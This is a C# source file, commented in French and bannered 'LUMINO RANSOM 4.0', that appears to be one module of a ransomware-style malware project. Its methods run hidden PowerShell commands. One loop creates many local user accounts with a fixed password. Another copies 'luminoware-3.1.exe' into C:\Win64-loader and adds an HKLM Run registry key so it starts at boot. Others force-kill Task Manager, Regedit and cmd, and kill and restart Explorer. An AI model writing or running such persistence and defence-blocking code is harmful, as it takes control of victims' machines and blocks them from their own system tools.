/*




                                                                                                                                                                                                                                                                                             
LLLLLLLLLLL             UUUUUUUU     UUUUUUUUMMMMMMMM               MMMMMMMMIIIIIIIIIINNNNNNNN        NNNNNNNN     OOOOOOOOO               RRRRRRRRRRRRRRRRR                  AAA               NNNNNNNN        NNNNNNNN   SSSSSSSSSSSSSSS      OOOOOOOOO     MMMMMMMM               MMMMMMMM
L:::::::::L             U::::::U     U::::::UM:::::::M             M:::::::MI::::::::IN:::::::N       N::::::N   OO:::::::::OO             R::::::::::::::::R                A:::A              N:::::::N       N::::::N SS:::::::::::::::S   OO:::::::::OO   M:::::::M             M:::::::M
L:::::::::L             U::::::U     U::::::UM::::::::M           M::::::::MI::::::::IN::::::::N      N::::::N OO:::::::::::::OO           R::::::RRRRRR:::::R              A:::::A             N::::::::N      N::::::NS:::::SSSSSS::::::S OO:::::::::::::OO M::::::::M           M::::::::M
LL:::::::LL             UU:::::U     U:::::UUM:::::::::M         M:::::::::MII::::::IIN:::::::::N     N::::::NO:::::::OOO:::::::O          RR:::::R     R:::::R            A:::::::A            N:::::::::N     N::::::NS:::::S     SSSSSSSO:::::::OOO:::::::OM:::::::::M         M:::::::::M
  L:::::L                U:::::U     U:::::U M::::::::::M       M::::::::::M  I::::I  N::::::::::N    N::::::NO::::::O   O::::::O            R::::R     R:::::R           A:::::::::A           N::::::::::N    N::::::NS:::::S            O::::::O   O::::::OM::::::::::M       M::::::::::M
  L:::::L                U:::::D     D:::::U M:::::::::::M     M:::::::::::M  I::::I  N:::::::::::N   N::::::NO:::::O     O:::::O            R::::R     R:::::R          A:::::A:::::A          N:::::::::::N   N::::::NS:::::S            O:::::O     O:::::OM:::::::::::M     M:::::::::::M
  L:::::L                U:::::D     D:::::U M:::::::M::::M   M::::M:::::::M  I::::I  N:::::::N::::N  N::::::NO:::::O     O:::::O            R::::RRRRRR:::::R          A:::::A A:::::A         N:::::::N::::N  N::::::N S::::SSSS         O:::::O     O:::::OM:::::::M::::M   M::::M:::::::M
  L:::::L                U:::::D     D:::::U M::::::M M::::M M::::M M::::::M  I::::I  N::::::N N::::N N::::::NO:::::O     O:::::O            R:::::::::::::RR          A:::::A   A:::::A        N::::::N N::::N N::::::N  SS::::::SSSSS    O:::::O     O:::::OM::::::M M::::M M::::M M::::::M
  L:::::L                U:::::D     D:::::U M::::::M  M::::M::::M  M::::::M  I::::I  N::::::N  N::::N:::::::NO:::::O     O:::::O            R::::RRRRRR:::::R        A:::::A     A:::::A       N::::::N  N::::N:::::::N    SSS::::::::SS  O:::::O     O:::::OM::::::M  M::::M::::M  M::::::M
  L:::::L                U:::::D     D:::::U M::::::M   M:::::::M   M::::::M  I::::I  N::::::N   N:::::::::::NO:::::O     O:::::O            R::::R     R:::::R      A:::::AAAAAAAAA:::::A      N::::::N   N:::::::::::N       SSSSSS::::S O:::::O     O:::::OM::::::M   M:::::::M   M::::::M
  L:::::L                U:::::D     D:::::U M::::::M    M:::::M    M::::::M  I::::I  N::::::N    N::::::::::NO:::::O     O:::::O            R::::R     R:::::R     A:::::::::::::::::::::A     N::::::N    N::::::::::N            S:::::SO:::::O     O:::::OM::::::M    M:::::M    M::::::M
  L:::::L         LLLLLL U::::::U   U::::::U M::::::M     MMMMM     M::::::M  I::::I  N::::::N     N:::::::::NO::::::O   O::::::O            R::::R     R:::::R    A:::::AAAAAAAAAAAAA:::::A    N::::::N     N:::::::::N            S:::::SO::::::O   O::::::OM::::::M     MMMMM     M::::::M
LL:::::::LLLLLLLLL:::::L U:::::::UUU:::::::U M::::::M               M::::::MII::::::IIN::::::N      N::::::::NO:::::::OOO:::::::O          RR:::::R     R:::::R   A:::::A             A:::::A   N::::::N      N::::::::NSSSSSSS     S:::::SO:::::::OOO:::::::OM::::::M               M::::::M
L::::::::::::::::::::::L  UU:::::::::::::UU  M::::::M               M::::::MI::::::::IN::::::N       N:::::::N OO:::::::::::::OO           R::::::R     R:::::R  A:::::A               A:::::A  N::::::N       N:::::::NS::::::SSSSSS:::::S OO:::::::::::::OO M::::::M               M::::::M
L::::::::::::::::::::::L    UU:::::::::UU    M::::::M               M::::::MI::::::::IN::::::N        N::::::N   OO:::::::::OO             R::::::R     R:::::R A:::::A                 A:::::A N::::::N        N::::::NS:::::::::::::::SS    OO:::::::::OO   M::::::M               M::::::M
LLLLLLLLLLLLLLLLLLLLLLLL      UUUUUUUUU      MMMMMMMM               MMMMMMMMIIIIIIIIIINNNNNNNN         NNNNNNN     OOOOOOOOO               RRRRRRRR     RRRRRRRAAAAAAA                   AAAAAAANNNNNNNN         NNNNNNN SSSSSSSSSSSSSSS        OOOOOOOOO     MMMMMMMM               MMMMMMMM
                                                                                                                                                                                                                                                                                             
                                                                                                                                                                                                                                                                                             
     __ __             __     
    /\ \\ \          /'__`\   
    \ \ \\ \        /\ \/\ \  
     \ \ \\ \_      \ \ \ \ \ 
      \ \__ ,__\ __  \ \ \_\ \
       \/_/\_\_//\_\  \ \____/
          \/_/  \/_/   \/___/ 
                                                                                                                                                                                                                                                                                           
      



                                                                                                                                                                                                                                                                                             
*/


/*\|---------------------------------------------------------------------------------------------------------------|\*/
/**/        using System.Diagnostics;      /*\| Librairie pour les processus CMD et PowerShell  (Class Process)    |\*/
/*\|---------------------------------------------------------------------------------------------------------------|\*/


// namespace CMD
namespace CMD
{

    // class CMD_class
    internal class CMD_class
    {



        public void Users_Chiants(int nombre_util) // Création de comptes utilisateurs
        {
            int f = 0;                // Variable pour savoir le nombre de comptes utilisateurs à creer

            while (f < nombre_util) // Boucle pour créer les comptes utilisateurs jusqu'à la valeur de la variable "nombre_util"
            {
                try
                {
                    System.Threading.Thread.Sleep(1000);                                            // Pause de 1 seconde
                    Process mtd = new Process();                                                    // Création d'un nouveau processus "mtd"
                    mtd.StartInfo.FileName = "powershell.exe";                                      // Définition de l'application/processus à executer ("powershell.exe"/ Powershell Windows)
                    mtd.StartInfo.Arguments = "/C net user Lumino2.0-YT-" + f + " Lumino-S /add";   // Définition des arguments à passer à l'application/processus à executer (Création d'un compte utilisateur nommé "Lumino2.0-YT-" avec le mot de passe Lumino-S)
                    mtd.StartInfo.UseShellExecute = true;                                           // On utilise le shell de l'OS
                    mtd.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;                          // On cache la fenêtre du processus
                    mtd.Start();                                                                    // On démarre le processus avec les paramètres définis précédemment
                    mtd.Close();                                                                    // On ferme le processus

                }
                catch (System.IO.FileNotFoundException) { }; // Si le processus n'est pas trouvé, on ne fait rien
                f++; // On incrémente la variable "f" de 1
            }


        }

        /////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

        public void Registry_Copy() // Copie de l'executable dans le répertoire "C:\Win64-loader" et ajout de la clé de registre pour le lancement au démarrage
        {
            try
            {
                System.Threading.Thread.Sleep(1000);                                                                                                                                                                                                         // Pause de 1 seconde
                Process mtd = new Process();                                                                                                                                                                                                                 // Création d'un nouveau processus "mtd"
                mtd.StartInfo.FileName = "powershell.exe";                                                                                                                                                                                                   // Définition de l'application/processus à executer ("powershell.exe"/ Powershell Windows)
                mtd.StartInfo.Arguments = "/C mkdir C:\\Win64-loader & copy luminoware-3.1.exe C:\\Win64-loader\\ & reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /v Luminoware-3.1 /t REG_SZ /d C:\\Win64-loader\\luminoware-3.1.exe";    // Définition des arguments à passer à l'application/processus à executer (Création du répertoire "C:\Win64-loader", copie de l'executable dans le répertoire "C:\Win64-loader" et ajout de la clé de registre pour le lancement au démarrage)
                mtd.StartInfo.UseShellExecute = true;                                                                                                                                                                                                        // On utilise le shell de l'OS
                mtd.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;                                                                                                                                                                                       // On cache la fenêtre du processus
                mtd.Start();                                                                                                                                                                                                                                 // On démarre le processus avec les paramètres définis précédemment
                mtd.Close();                                                                                                                                                                                                                                 // On ferme le processus

            }
            catch (System.IO.FileNotFoundException) { }; // Si le processus n'est pas trouvé, on ne fait rien


        }

        /////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

        public void CMD_rtc() // Fonction de fermeture des processus Regedit, TaskManager, CMD (R.T.C)

        {
            try
            {
                Process mtd = new Process();                                                                                                     // Création d'un nouveau processus "mtd"
                mtd.StartInfo.FileName = "powershell.exe";                                                                                       // Définition de l'application/processus à executer ("powershell.exe"/ Powershell Windows)
                mtd.StartInfo.Arguments = "/C taskkill /f /im taskmgr.exe & taskkill /f /im regedit.exe & taskkill /f /im cmd.exe";              // Définition des arguments à passer à l'application/processus à executer (Fermeture des processus Regedit, TaskManager, CMD)
                mtd.StartInfo.UseShellExecute = true;                                                                                            // On utilise le shell de l'OS
                mtd.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;                                                                           // On cache la fenêtre du processus
                mtd.Start();                                                                                                                     // On démarre le processus avec les paramètres définis précédemment
                mtd.Close();                                                                                                                     // On ferme le processus
            }
            catch (System.UnauthorizedAccessException) { }    // Si on n'a pas l'autorisation requise, on ne fait rien
        }

        //////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

        public void CMD_killExplorer() // Fonction de fermeture du processus Explorer.exe
        {
            try
            {
                Process mtd1 = new Process();                                                   // Création d'un nouveau processus "mtd"
                mtd1.StartInfo.FileName = "powershell.exe";                                     // Définition de l'application/processus à executer ("powershell.exe"/ Powershell Windows)
                mtd1.StartInfo.Arguments = "/C taskkill /f /im explorer.exe";                   // Définition des arguments à passer à l'application/processus à executer (Fermeture du processus Explorer.exe)
                mtd1.StartInfo.UseShellExecute = true;                                          // On utilise le shell de l'OS
                mtd1.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;                         // On cache la fenêtre du processus
                mtd1.Start();                                                                   // On démarre le processus avec les paramètres définis précédemment
                mtd1.Close();                                                                   // On ferme le processus
            }
            catch (System.UnauthorizedAccessException) { }   // Si on n'a pas l'autorisation requise, on ne fait rien

        }

        /////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

        public void CMD_startExplorer() // Fonction de lancement du processus Explorer.exe
        {
            try
            {
                Process mtd2 = new Process();                                                  // Création d'un nouveau processus "mtd"
                mtd2.StartInfo.FileName = "powershell.exe";                                    // Définition de l'application/processus à executer ("powershell.exe"/ Powershell Windows)
                mtd2.StartInfo.Arguments = "/C start explorer.exe";                            // Définition des arguments à passer à l'application/processus à executer (Lancement du processus Explorer.exe)
                mtd2.StartInfo.UseShellExecute = true;                                         // On utilise le shell de l'OS
                mtd2.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;                        // On cache la fenêtre du processus
                mtd2.Start();                                                                  // On démarre le processus avec les paramètres définis précédemment
                mtd2.Close();                                                                  // On ferme le processus
            }
            catch (System.UnauthorizedAccessException) { } // Si on n'a pas l'autorisation requise, on ne fait rien

        }


    }
}
